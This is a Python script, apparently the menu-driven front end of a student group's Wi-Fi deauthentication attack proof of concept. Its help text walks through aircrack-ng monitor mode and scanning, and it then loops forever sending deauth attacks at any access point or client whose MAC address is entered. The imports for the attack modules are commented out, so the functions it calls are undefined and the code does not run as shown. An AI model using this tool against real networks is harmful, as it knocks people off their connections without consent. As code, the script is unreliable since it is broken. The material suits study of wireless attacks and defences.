# import os
import sys
# from modules.deauth import *
# from modules.scanning import *
import re
banner = """

██████╗ ███████╗     █████╗ ██╗   ██╗████████╗██╗  ██╗    ████████╗ ██████╗  ██████╗ ██╗     
██╔══██╗██╔════╝    ██╔══██╗██║   ██║╚══██╔══╝██║  ██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██║  ██║█████╗█████╗███████║██║   ██║   ██║   ███████║       ██║   ██║   ██║██║   ██║██║     
██║  ██║██╔══╝╚════╝██╔══██║██║   ██║   ██║   ██╔══██║       ██║   ██║   ██║██║   ██║██║     
██████╔╝███████╗    ██║  ██║╚██████╔╝   ██║   ██║  ██║       ██║   ╚██████╔╝╚██████╔╝███████╗
╚═════╝ ╚══════╝    ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
                                                                                             
Group 162 - Research De-authentication attack & PoC
Group members: Tran Thi Thanh - Team leader👩‍💻
               Nguyen Minh Quang - super member
\n<-- Just for education purposes -->
"""
interface = 'wlp5s0mon'
print(banner)

main_help = """
    How to use:
    Step 1: Put your network interface to monitor mode using this command \"aircrack-ng check kill & aircrack-ng start <interface>\"
    Step 2 <option>: Get AP List, to get AP List please use the scanning module using this command \"python3 module/scanning.py\"
    Step 3 <option>: Get Station connected to AP using \"python3 module/scanning_client.py\"
    Step 4: Choose Attack Mode by   -> Enter 1 for Attack AP
                                    -> Enter 2 for Attack Specific Client Connected to an AP
"""

attack_mode_menu = """
    1. To AP
    2. To Client
    """

def is_mac_address(mac):
    if re.match("[0-9a-f]{2}([-:])[0-9a-f]{2}(\\1[0-9a-f]{2}){4}$", mac.lower()):
        return True
    return False

def main():
    options = input("[+] Enter your options (press h for help): ")
    try:
        if options == 'h':
            print(main_help)
        elif options == '1':
            AP_MAC = input("[+] Enter AP MAC address (XX:XX:XX:XX:XX:XX): ")
            if is_mac_address(AP_MAC) == False:
                print("[X] Please re-enter correct AP MAC address !!")
            else:
                try:
                    while True:
                        craft_deauth_attack_to_AP(AP_MAC)
                except KeyboardInterrupt:
                    print("Bye")
        elif options == '2':
            AP_MAC1 = input("[+] Enter AP MAC address: ")
            client_mac = input("[+] Enter Client MAC address: ")
            if is_mac_address(AP_MAC1) == False:
                print("[X] Please re-enter correct AP MAC Address Format!! ")
            elif is_mac_address(client_mac) == False:
                print("[X] Please re-enter correct Client MAC Address Format!")
            elif is_mac_address(AP_MAC1) == False and is_mac_address(client_mac) == False:
                print("[X] Both MAC Address You Entered Is Invalid !")
            else:
                try:
                    while True:
                        craft_deauth_attack_to_AP(client_mac, AP_MAC1)
                except KeyboardInterrupt:
                    print("Bye")
        else:
            print("Invalid Option !! Quitting...")
            sys.exit(1)
    except KeyboardInterrupt:
        print("Bye :))")

if __name__ == "__main__":
    while True:
        main()
